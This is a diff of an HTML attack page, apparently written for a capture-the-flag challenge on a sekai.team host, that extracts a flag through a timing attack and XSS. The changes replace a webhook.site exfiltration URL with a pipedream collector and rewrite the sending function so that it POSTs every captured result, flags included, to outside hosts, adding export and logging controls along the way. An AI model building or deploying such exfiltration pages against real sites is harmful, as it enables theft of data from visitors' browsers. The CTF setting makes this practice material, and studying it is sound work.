@@ -5,11 +5,22 @@
 </head>
 <body>
     <h1>Flag Extraction in Progress...</h1>
-    <div id="status">Starting attack...</div>
-    <div id="results"></div>
+    <div id="status" style="padding:10px; background:#e3f2fd; border-radius:5px; margin:10px 0;">Starting attack...</div>
+    
+    <div style="margin: 10px 0;">
+        <button onclick="exportData()" style="padding:8px 16px; background:#4caf50; color:white; border:none; border-radius:4px; cursor:pointer;">
+            Export Results
+        </button>
+        <button onclick="clearResults()" style="padding:8px 16px; background:#f44336; color:white; border:none; border-radius:4px; cursor:pointer; margin-left:10px;">
+            Clear Results  
+        </button>
+    </div>
+    
+    <div id="results" style="max-height:400px; overflow-y:auto; border:1px solid #ccc; padding:10px; background:#fafafa; border-radius:5px;"></div>
 
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac'; // 替换为实际的webhook URL
+        // 多种数据收集方式
+        const DATA_COLLECTORS = ['https://eojrldtpywxpwfm.m.pipedream.net'];
         const TARGET_DOMAIN = 'nbv.chals.sekai.team';
         
         // 常见flag字符的ASCII码范围
@@ -22,12 +33,73 @@
             console.log(msg);
         }
         
+        // 本地数据收集和显示
+        let collectedData = [];
+        
         function sendResult(data) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).catch(e => console.log('Send failed:', e));
+            // 收集数据到本地数组
+            collectedData.push({
+                timestamp: Date.now(),
+                ...data
+            });
+            
+            // 尝试多个端点发送数据
+            DATA_COLLECTORS.forEach((url, index) => {
+                setTimeout(() => {
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            timestamp: Date.now(),
+                            collector: index,
+                            ...data
+                        })
+                    }).catch(e => console.log(`Collector ${index} failed:`, e));
+                }, index * 100);
+            });
+            
+            // 实时显示结果
+            const resultDiv = document.getElementById('results');
+            const logEntry = document.createElement('div');
+            logEntry.style.cssText = 'margin:5px 0; padding:5px; background:#f0f0f0; border-radius:3px; font-family:monospace; font-size:12px; word-break:break-all;';
+            
+            // 高亮重要信息
+            if(data.method === 'xss_direct' || data.flag) {
+                logEntry.style.background = '#ffeb3b';
+                logEntry.style.fontWeight = 'bold';
+            }
+            
+            logEntry.innerHTML = `
+                <strong>[${new Date().toLocaleTimeString()}]</strong> 
+                <span style="color: #1976d2;">${data.method || 'unknown'}</span>: 
+                ${JSON.stringify(data, null, 2).replace(/\n/g, '<br>').replace(/ /g, '&nbsp;')}
+            `;
+            resultDiv.appendChild(logEntry);
+            
+            // 保持最新100条记录
+            while(resultDiv.children.length > 100) {
+                resultDiv.removeChild(resultDiv.firstChild);
+            }
+            
+            // 滚动到底部
+            resultDiv.scrollTop = resultDiv.scrollHeight;
+        }
+        
+        // 导出数据功能
+        function exportData() {
+            const dataStr = JSON.stringify(collectedData, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'ctf_attack_results.json';
+            link.click();
+        }
+        
+        // 清理结果功能
+        function clearResults() {
+            document.getElementById('results').innerHTML = '';
+            collectedData = [];
         }
         
         // 方法1: 时序攻击 - 测试特定位置的字符
